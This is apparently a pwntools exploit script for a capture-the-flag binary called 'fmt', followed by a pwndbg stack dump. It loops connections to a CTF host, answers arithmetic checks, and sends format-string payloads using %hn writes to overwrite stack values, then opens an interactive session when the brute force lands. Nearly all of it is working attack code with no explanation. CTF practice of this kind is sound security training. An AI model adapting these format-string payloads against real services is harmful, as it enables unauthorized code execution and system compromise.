from pwn import *
context.log_level='debug'
context.arch='amd64'
def check():
    p.recvuntil(b'what\'s ')
    num1=p.recvuntil(b' ').strip(b' ')
    p.recvuntil(b'add ')
    num2=p.recvuntil(b'\n').strip()
    print(num1,num2)
    num1=int(num1)
    num2=int(num2)
    print(num1,num2)
    p.sendline(str(num1+num2).encode())
while True:
    # p=process('./fmt')
    p=remote('ctf.qwq.cc',10381)
    for i in range(0,5):
        check()
    p.recvuntil(b'leave\n')
    # gdb.attach(p,'b *$rebase(0x0000000000000B4B)')
    # pause()
    p.sendline(b'1')
    p.recvuntil(b'Input:\n')
    payload=b'%40c%10$hhn'
    p.sendline(payload)
    p.recvuntil(b'leave\n')
    p.sendline(b'1')
    # payload=b'%3352%14$hn'
    payload=b'%3368c%14$hn'
    p.sendline(payload)
    recvthing=p.recvuntil(b'leave\n',timeout=2)
    print('recvthing',recvthing)
    if b'leave' in recvthing:
        print('check in')
        p.close()
        continue
    print('check not in')
    p.interactive()

'''
pwndbg> stack 30
00:0000│ rdi rsp 0x7ffc1d10dbd0 ◂— 'aaaaaaaabbbbbbbb'
01:0008│         0x7ffc1d10dbd8 ◂— 'bbbbbbbb'
02:0010│         0x7ffc1d10dbe0 ◂— 0x0
03:0018│         0x7ffc1d10dbe8 ◂— 0x5a7a7aaf22b87500
04:0020│ rbp     0x7ffc1d10dbf0 —▸ 0x7ffc1d10dc10 —▸ 0x7ffc1d10dc30 ◂— 0x1
05:0028│         0x7ffc1d10dbf8 —▸ 0x55d601200cf4 (game+117) ◂— nop 
06:0030│         0x7ffc1d10dc00 ◂— 0x1
07:0038│         0x7ffc1d10dc08 ◂— 0x5a7a7aaf22b87500
08:0040│         0x7ffc1d10dc10 —▸ 0x7ffc1d10dc30 ◂— 0x1
09:0048│         0x7ffc1d10dc18 —▸ 0x55d601200dac (main+117) ◂— mov eax, 0
0a:0050│         0x7ffc1d10dc20 ◂— 0x0
0b:0058│         0x7ffc1d10dc28 ◂— 0x5c449fad0
0c:0060│         0x7ffc1d10dc30 ◂— 0x1
0d:0068│         0x7ffc1d10dc38 —▸ 0x7f16c429b18a (__libc_start_call_main+122) ◂— mov edi, eax
0e:0070│         0x7ffc1d10dc40 —▸ 0x7ffc1d10dd30 —▸ 0x7ffc1d10dd38 ◂— 0x38 /* '8' */
0f:0078│         0x7ffc1d10dc48 —▸ 0x55d601200d37 (main) ◂— push rbp
10:0080│         0x7ffc1d10dc50 ◂— 0x101200040 /* '@' */
11:0088│         0x7ffc1d10dc58 —▸ 0x7ffc1d10dd48 —▸ 0x7ffc1d10f2d0 ◂— 0x4f4300746d662f2e /* './fmt' */
12:0090│         0x7ffc1d10dc60 —▸ 0x7ffc1d10dd48 —▸ 0x7ffc1d10f2d0 ◂— 0x4f4300746d662f2e /* './fmt' */
13:0098│         0x7ffc1d10dc68 ◂— 0x33641314d5a3d00e
14:00a0│         0x7ffc1d10dc70 ◂— 0x0
15:00a8│         0x7ffc1d10dc78 —▸ 0x7ffc1d10dd58 —▸ 0x7ffc1d10f2d6 ◂— 'COLORFGBG=15;0'
16:00b0│         0x7ffc1d10dc80 ◂— 0x0
17:00b8│         0x7ffc1d10dc88 —▸ 0x7f16c449f020 (_rtld_global) —▸ 0x7f16c44a02e0 —▸ 0x55d601200000 ◂— jg 0x55d601200047     
'''